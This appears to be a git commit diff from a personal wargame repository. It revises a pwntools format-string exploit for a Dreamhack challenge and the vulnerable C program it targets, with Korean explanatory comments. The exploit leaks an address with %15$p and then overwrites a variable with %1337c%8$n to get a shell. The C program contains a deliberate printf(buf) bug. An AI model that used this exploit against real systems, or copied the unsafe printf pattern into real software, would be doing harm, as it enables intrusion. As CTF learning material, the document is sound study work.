8ffb6dfdc13359863b179f9c386cab0bbea5388d
Juhyeong Kim <kesnt8892@gmail.com>
2024-08-19 12:34:42 +0000

    Format_String_Bug solved

--- solved/Format_String_Bug/ex.py
+++ solved/Format_String_Bug/ex.py
@@ -1,20 +1,18 @@
 from pwn import *
 
-p = remote("host3.dreamhack.games", 17743)
+# p = process("./fsb_overwrite")
+p = remote("host3.dreamhack.games", 8643)
 elf = ELF("./fsb_overwrite")
 
-# [1] Get Address of changeme
-p.sendline(b"%15$p")  # FSB
-leaked = int(p.recvline()[:-1], 16)
-code_base = leaked - 0x1293
-changeme = code_base + elf.symbols["changeme"]
+payload = b"%15$p"  # [rsp + 0x48] 에 저장된 주소를 읽어오기 위함
+p.send(payload)
 
-# [2] Overwrite changeme
-payload = b"%1337c"  # 1337을 min width로 하는 문자를 출력해 1337만큼 문자열이 사용되게 합니다.
-payload += b"%8$n"  # 현재까지 사용된 문자열의 길이를 8번째 인자(p64(changeme)) 주소에 작성합니다.
-payload += b"A" * 6  # 8의 배수를 위한 패딩입니다.
-payload = payload + p64(changeme)  # 페이로드 16바이트 뒤에 changeme 변수의 주소를 작성합니다.
+binary_base = int(p.recvline()[:-1], 16) - 0x1293  # [rsp + 0x48]에서 읽어온 주소에서 해당 주소의 오프셋을 빼주어서 바이너리의 베이스 주소를 구함
+# addr_changeme = binary_base + elf.symbols['changeme']
+addr_changeme = binary_base + 0x401c  # 바이너리의 베이스 주소에서 changeme 변수의 오프셋을 더해줌
 
-p.sendline(payload)
+payload = b"%1337c%8$n".ljust(16)  # 6번째 인자가 [rsp]이므로, [rsp + 0x10] 은 8번째 인자
+payload += p64(addr_changeme)
 
+p.send(payload)
 p.interactive()
--- solved/Format_String_Bug/fsb_overwrite.c
+++ solved/Format_String_Bug/fsb_overwrite.c
@@ -1,34 +1,41 @@
 // Name: fsb_overwrite.c
 // Compile: gcc -o fsb_overwrite fsb_overwrite.c
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-void get_string(char *buf, size_t size) {
-  ssize_t i = read(0, buf, size);
-  if (i == -1) {
+void get_string(char *buf, size_t size)
+{
+  ssize_t i = read(0, buf, size); // 읽은 바이트 수를 리턴 (-1 : 오류, 0 : EOF 만난 경우)
+  if (i == -1)
+  {
     perror("read");
     exit(1);
   }
-  if (i < size) {
-    if (i > 0 && buf[i - 1] == '\n') i--;
-    buf[i] = 0;
+
+  if (i < size) // 0x20보다 읽은 바이트 수가 적은 경우
+  {
+    if (i > 0 && buf[i - 1] == '\n') // buf의 마지막이 개행문자로 끝나는 경우
+      i--;
+    buf[i] = 0; // 개행문자('\n') 을 지우고 `0`으로 설정
   }
 }
 
 int changeme;
 
-int main() {
+int main()
+{
   char buf[0x20];
-  
+
   setbuf(stdout, NULL);
-  
-  while (1) {
+
+  while (1)
+  {
     get_string(buf, 0x20);
     printf(buf);
-    puts("");
-    if (changeme == 1337) {
+    puts(""); // 개행문자 추가
+    if (changeme == 1337)
+    {
       system("/bin/sh");
     }
   }
